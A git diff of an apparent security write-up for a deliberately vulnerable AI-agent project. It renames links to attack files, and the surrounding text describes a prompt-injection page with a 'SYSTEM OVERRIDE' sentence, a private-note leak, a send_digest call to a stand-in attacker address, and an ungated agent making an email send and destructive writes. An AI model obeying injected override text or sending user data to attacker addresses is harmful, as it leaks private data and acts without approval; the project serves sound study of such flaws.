@@ -82,11 +82,11 @@ Every structural claim in this repo is now demonstrated by calling the vulnerabl
 directly, with no model in the loop at all. `fetch_url('http://127.0.0.1:8124/payload.html')`
 returns the `SYSTEM OVERRIDE` sentence sitting inline with the ordinary paragraph text — proving
 both that there's no domain restriction and that there's no trust boundary, in one command
-([`MANUAL_VULN_A.md`](../attacks/MANUAL_VULN_A.md)). `search_notes('private')` returns my private
+([`VULN_A.md`](../attacks/VULN_A.md)). `search_notes('private')` returns my private
 note in full, and the note's own "Private" label is part of what the search matched on
-([`MANUAL_VULN_E.md`](../attacks/MANUAL_VULN_E.md)). `send_digest('attacker@evil-exfil.example', …)`
+([`VULN_E.md`](../attacks/VULN_E.md)). `send_digest('attacker@evil-exfil.example', …)`
 writes a perfectly normal-looking outbox entry addressed to the attacker
-([`MANUAL_VULN_B.md`](../attacks/MANUAL_VULN_B.md)).
+([`VULN_B.md`](../attacks/VULN_B.md)).
 
 Those results are true on every run, for every model, forever. That's the difference between a
 structural result and a behavioral one, and it's the distinction the rest of this project is
@@ -97,7 +97,7 @@ proof. D (no approval gate) and G (every tool available in every phase) are prop
 loop. I demonstrated them behaviorally instead: three runs of identical, unchanged code against
 the same trivial request — `"Say ok"` — produced three different outcomes. Reads only. Nothing at
 all. And then a real email send plus two destructive file writes, back to back, unprompted and
-ungated ([`MANUAL_VULN_DG.md`](../attacks/MANUAL_VULN_DG.md)).
+ungated ([`VULN_DG.md`](../attacks/VULN_DG.md)).
 
 Same code, three behaviors. That *is* the vulnerability. The safe run didn't patch anything.
 
@@ -182,7 +182,7 @@ time.** The test asserted that a denial happened. It never asserted anything abo
 denial said. A test only protects the property it actually asserts, and I found this one by
 watching a live run, not by reading my own output.
 
-Full account: [`MANUAL_VULN_B2_verbose_denial.md`](../attacks/MANUAL_VULN_B2_verbose_denial.md).
+Full account: [`VULN_B2.md`](../attacks/VULN_B2.md).
 
 ## What I still can't claim
 
